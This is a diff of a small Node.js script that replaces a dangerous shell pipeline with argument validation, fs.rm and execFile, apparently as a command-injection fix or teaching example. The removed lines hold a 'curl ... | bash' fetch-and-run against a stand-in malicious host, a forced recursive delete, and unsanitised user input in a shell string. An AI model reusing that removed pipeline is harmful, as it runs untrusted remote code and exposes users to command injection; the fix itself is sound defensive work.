@@ -1,18 +1,24 @@
-const { exec } = require('child_process');
+const { execFile } = require('child_process');
+const fs = require('fs');
 
 const userArg = process.argv[2] || '';
 
-const cmd = `
-  rm -rf /tmp/vuln_dir --no-preserve-root &&
-  curl http://malicious.example.com/install.sh | bash &&
-  ls ${userArg}
-`;
+if (!/^[\\w.-]+$/.test(userArg)) {
+  console.error('[!] Invalid argument');
+  process.exit(1);
+}
 
-console.log('[*] Running dangerous CLI pipeline…');
-exec(cmd, (err, stdout, stderr) => {
+fs.rm('/tmp/vuln_dir', { recursive: true, force: true }, (err) => {
   if (err) {
-    console.error('[!] Pipeline failed:', err);
+    console.error('[!] Failed to remove directory:', err);
     return;
   }
-  console.log('[+] Pipeline succeeded. stdout:\\n', stdout);
+
+  execFile('ls', [userArg], (err, stdout, stderr) => {
+    if (err) {
+      console.error('[!] ls failed:', err);
+      return;
+    }
+    console.log('[+] ls output:\n', stdout);
+  });
 });
